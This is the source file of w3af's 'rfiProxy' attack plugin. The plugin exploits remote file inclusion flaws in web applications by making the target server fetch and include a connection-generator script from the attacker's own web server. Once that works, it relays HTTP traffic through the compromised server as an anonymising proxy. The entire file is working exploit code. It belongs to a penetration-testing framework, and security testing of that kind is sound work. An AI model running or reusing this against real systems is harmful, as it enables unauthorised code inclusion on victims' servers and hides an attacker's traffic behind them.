'''
rfiProxy.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''

from core.data.fuzzer.fuzzer import createRandAlNum
# This separator is a Unique string used for parsing. 
RFI_SEPARATOR = createRandAlNum( 25 )
URLOPENER = None

import core.controllers.outputManager as om
# options
from core.data.options.option import option
from core.data.options.optionList import optionList
from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin
import core.data.kb.knowledgeBase as kb
from core.controllers.w3afException import w3afException
from core.controllers.daemons.webserver import webserver
import core.data.parsers.urlParser as urlParser

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from core.controllers.threads.w3afThread import w3afThread
import time
import socket, urlparse, urllib
from core.controllers.threads.threadManager import threadManagerObj as tm
import core.data.constants.w3afPorts as w3afPorts

### TODO: I dont like globals, please see TODO below.
url = ''
exploitData = ''
rfiConnGenerator = ''

class rfiProxy(baseAttackPlugin, w3afThread):
    '''
    Exploits remote file inclusions to create a proxy server.
    
    @author: Andres Riancho ( andres.riancho@gmail.com )    
    '''

    def __init__( self ):
        baseAttackPlugin.__init__(self)
        w3afThread.__init__( self )
        
        self._listenAddress = '127.0.0.1'
        self._proxyPort = w3afPorts.RFIPROXY
        self._rfiConnGenerator = ''
        self._httpdPort = w3afPorts.RFIPROXY2
        
        self._proxy = None
        self._wS = None
        self._go = True
        
        self._url = None
        self._method = None
        self._exploitQs = None
        self._proxyPublicIP = None
        
    def fastExploit(self, url, method, data ):
        '''
        Exploits a web app with osCommanding vuln.
        
        @parameter url: A string containing the Url to exploit ( http://somehost.com/foo.php )
        @parameter method: A string containing the method to send the data ( post / get )
        @parameter data: A string containing data to send with a mark that defines
        which is the vulnerable parameter ( aa=notMe&bb=almost&cc=[VULNERABLE] )
        '''
        pass
        
        return self._shell
    
    def getAttackType(self):
        return 'proxy'
        
    def getVulnName2Exploit( self ):
        return 'remoteFileInclude'
                
    def exploit(self, vulnToExploit=None ):
        '''
        Exploits a rfiVulns that were found and stored in the kb.

        @return: True if the shell is working and the user can start using the proxy.
        '''
        om.out.information( 'rfiProxy exploit plugin is starting.' )
        rfiVulns = kb.kb.getData( 'remoteFileInclude' , 'rfi' )
        if len( rfiVulns ) == 0:
            raise w3afException('No remote file inclusion vulnerabilities have been found.')

        for vuln in rfiVulns:
            # Try to get a shell using all vuln
            if self._generateProxy(vuln):
                # A proxy was generated.
                kb.kb.append( self, 'proxy', self )
                return True
                    
        return False
        
    def _generateProxy( self, vuln ):
        '''
        @parameter vuln: The vuln to exploit.
        @return: True if the user can start using the proxy.
        '''
        # Set proxy parameters
        self._url = urlParser.uri2url( vuln.getURL() )
        self._method = vuln.getMethod()
        self._exploitData = vuln.getDc()
        self._variable = vuln.getVar()
        
        self.start2()
        time.sleep(0.5) # wait for webserver thread to start
        return True
        
    def stop(self):
        if self._running:
            if self._wS != None:
                self._wS.stop()
            self._proxy.server_close()
            self._go = False
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect((self._listenAddress, self._proxyPort))
                s.close()
            except:
                pass
            self._running = False
        
    def rexec( self, command ):
        '''
        The only command available is stop, it will stop the web and proxy server.
        '''
        if command != 'stop' and command != 'exit':
            message = 'Available commands:\n'
            message += 'stop              Terminate the proxy and web server processes used in this exploit.\n'
            message += 'exit              Return to previous menu, proxy will continue to work.\n'
            return message
        elif command == 'stop':
            if not self._running:
                message = 'No processes running.'
            else:
                self.stop()
                message = 'Stopping processes.'
            return message
        elif command == 'exit':
            if self._running:
                message = 'Proxy will keep running in background.'
            else:
                message = ''
            return message

    def run(self):
        '''
        Starts the http server that will become a proxy.
        
        '''
        if self._rfiConnGenerator == '':
            # If user failed to configure self._rfiConnGenerator we will run a webserver
            # and configure the _rfiConnGenerator attr for him
            if self._wS == None:
                om.out.information( 'Running a local httpd to serve the RFI connection generator to remote web app.' )
                self._wS = webserver( self._proxyPublicIP, self._httpdPort , 'webroot/')
                self._wS.start2()
                self._rfiConnGenerator = 'http://' + self._proxyPublicIP + ':' + str(self._httpdPort) + '/rfip.txt'
            
        ### TODO: I really dislike this, if someone knows how to send variables to 
        ### w3afProxyHandler in a nicer way, please contact me ( andres.riancho@gmail.com )
        global url
        global exploitData
        global variable
        global rfiConnGenerator
        url = self._url
        exploitData = self._exploitData
        rfiConnGenerator = self._rfiConnGenerator
        variable = self._variable
        
        self._proxy = HTTPServer((self._listenAddress, self._proxyPort ),  w3afProxyHandler )
        message = 'Proxy server running on '+ self._listenAddress + ':'+ str(self._proxyPort) +' .'
        message += ' You may now configure this proxy in w3af or your browser. '
        om.out.information( message )
        
        self._running = True
        while self._go:
            try:
                self._proxy.handle_request()
            except:
                self._proxy.server_close()
    
    def getOptions(self):
        # FIXME!
        return optionList()

    def getOptionsXML(self):
        '''
        This method returns a XML containing the Options that the plugin has.
        Using this XML the framework will build a window, a menu, or some other input method to retrieve
        the info from the user. The XML has to validate against the xml schema file located at :
        w3af/core/ui/userInterface.dtd
        
        @return: XML with the plugin options.
        ''' 
        return  '<?xml version="1.0" encoding="ISO-8859-1"?>\
        <OptionList>\
            <Option name="listenAddress">\
                <default>127.0.0.1</default>\
                <desc>IP address that the proxy will use to receive requests</desc>\
                <type>string</type>\
                <help></help>\
            </Option>\
            <Option name="proxyPort">\
                <default>8000</default>\
                <desc>Port that the proxy will use to receive requests</desc>\
                <type>integer</type>\
                <help></help>\
            </Option>\
            <Option name="httpdPort">\
                <default>8001</default>\
                <desc>Port that the local httpd will listen on.</desc>\
                <help>When exploiting a remote file include for generating a proxy, w3af can use a local web server to serve the included file. This setting will configure the TCP port where this webserver listens.</help>\
                <type>integer</type>\
                <help></help>\
            </Option>\
            <Option name="proxyPublicIP">\
                <default></default>\
                <desc>This is the ip that the remote server will connect to in order to retrieve the file inclusion.</desc>\
                <help>When exploiting a remote file include for generating a proxy, w3af can use a local web server to serve the included file. This setting will configure the IP address where this webserver listens.</help>\
                <type>string</type>\
                <help></help>\
            </Option>\
            <Option name="rfiConnGenerator">\
                <default></default>\
                <desc>URL for the remote file inclusion connection generator.</desc>\
                <type>string</type>\
                <help>If left blank, a local webserver will be runned at proxyPublicIP:httpdPort \
                and the connection generator \
                will be served to the remote web application this way.</help>\
            </Option>\
        </OptionList>\
        '
    
    def getRootProbability( self ):
        '''
        @return: This method returns the probability of getting a root shell using this attack plugin.
        This is used by the "exploit *" function to order the plugins and first try to exploit the more critical ones.
        This method should return 0 for an exploit that will never return a root shell, and 1 for an exploit that WILL ALWAYS
        return a root shell.
        '''
        return 0.0
        
    def setOptions( self, optionsMap ):
        '''
        This method sets all the options that are configured using the user interface 
        generated by the framework using the result of getOptionsXML().
        
        @parameter optionsMap: A dictionary with the options for the plugin.
        @return: No value is returned.
        ''' 
        self._listenAddress = optionsMap['listenAddress'].getValue()
        self._proxyPort = optionsMap['proxyPort'].getValue()
        self._httpdPort = optionsMap['httpdPort'].getValue()
        self._proxyPublicIP = optionsMap['proxyPublicIP'].getValue()
        self._rfiConnGenerator = optionsMap['rfiConnGenerator'].getValue()
    
    def setUrlOpener( self, urlOpener):
        '''
        This method should not be overwritten by any plugin (but you are free to do it, for example
        a good idea is to rewrite this method to change the UrlOpener to do some IDS evasion technic).
        
        This method takes a CustomUrllib object as parameter and assigns it to itself. 
        Then, on the testUrl method you use self.CustomUrlOpener._custom_urlopen(...) 
        to open a Url and you are sure that the plugin is using the user supplied
        settings (proxy, user agent, etc).
        
        @return: No value is returned.
        '''
        global URLOPENER
        URLOPENER = urlOpener
        
class w3afProxyHandler(BaseHTTPRequestHandler):

    def _work( self, host, port, send, proxyClientConnection ):
        
        postDataDict = {}
        postDataDict['rfipsend'] = send
        postDataDict['rfihost'] = host
        postDataDict['rfiport'] = port
        postDataDict['rfipsep'] = RFI_SEPARATOR
        postdata = urllib.urlencode( postDataDict )
        
        QueryStringDict = exploitData
        QueryStringDict[ variable ] = rfiConnGenerator
        qs = str( QueryStringDict )
        
        completeUrl = url + '?' + qs
        #req = urllib2.Request( completeUrl , postdata )

        try:
            response = URLOPENER.POST( completeUrl, postdata )
            #response = urllib2.urlopen( req )
        except w3afException, e:
            proxyClientConnection.close()
            om.out.error( 'Oops! Error when proxy tried to open remote site: ' + str(e) )
        else:
            page = response.getBody()
            theStart = page.find( RFI_SEPARATOR )
            theEnd = page.rfind( RFI_SEPARATOR )
            page = page[ theStart + len(RFI_SEPARATOR): theEnd ]
            page = page[ page.find('HTTP'):]
            proxyClientConnection.send( page )
            proxyClientConnection.close()

    def __init__( self, a, b, c):
        self._tm = tm
        BaseHTTPRequestHandler.__init__( self, a, b, c )
        
    def handle_one_request(self):
        """
        Handle a single HTTP request.
        """
        self.raw_requestline = self.rfile.readline()
        if not self.raw_requestline:
            self.close_connection = 1
            return
        if not self.parse_request(): # An error code has been sent, just exit
            return

        words = self.raw_requestline.split('\n')[0].split()
        if len( words ) == 3:
            command, url, version = words
            (scm, netloc, path, params, query, fragment) = urlparse.urlparse(url)
            if scm != 'http':
                self.send_error(501, 'Remote file inclusion proxy has no https support. Contribute <a href="http://w3af.sourceforge.net/">here</a>')
            else:
                splitNetloc = netloc.split(':')
                port = 80
                if len( splitNetloc ) == 2:
                    port = splitNetloc[1]
                host = splitNetloc[0]
        else:
            return

        del self.headers['Proxy-Connection']
        del self.headers['keep-alive']
        self.headers['connection'] = 'close'
        raw_request = self.raw_requestline
        for header in self.headers.keys():
            raw_request += header+': '
            raw_request += self.headers.getheader(header)
            raw_request += '\r\n'
        try:
            length = int(self.headers.getheader('content-length'))
        except:
            pass
        else:
            raw_request += '\r\n\r\n'
            raw_request += self.rfile.read(length)
        
        raw_request += '\r\n\r\n'
        
        proxyClientConnection = self.connection
        #targs = ( host, port, raw_request, proxyClientConnection )
        #self._tm.startFunction( target=self._work, args=targs, ownerObj=self )
        self._work( host, port, raw_request, proxyClientConnection )

    def getLongDesc( self ):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin exploits remote file inclusion vulnerabilities and returns a HTTP proxy. The proxy will use
        the remote file inclusion bug to navigate the web in an anonymous way.
        
        Six configurable parameters exist:
            - listenAddress
            - listenPort
            - httpdPort
            - proxyPublicIP
            - rfiConnGenerator
        '''
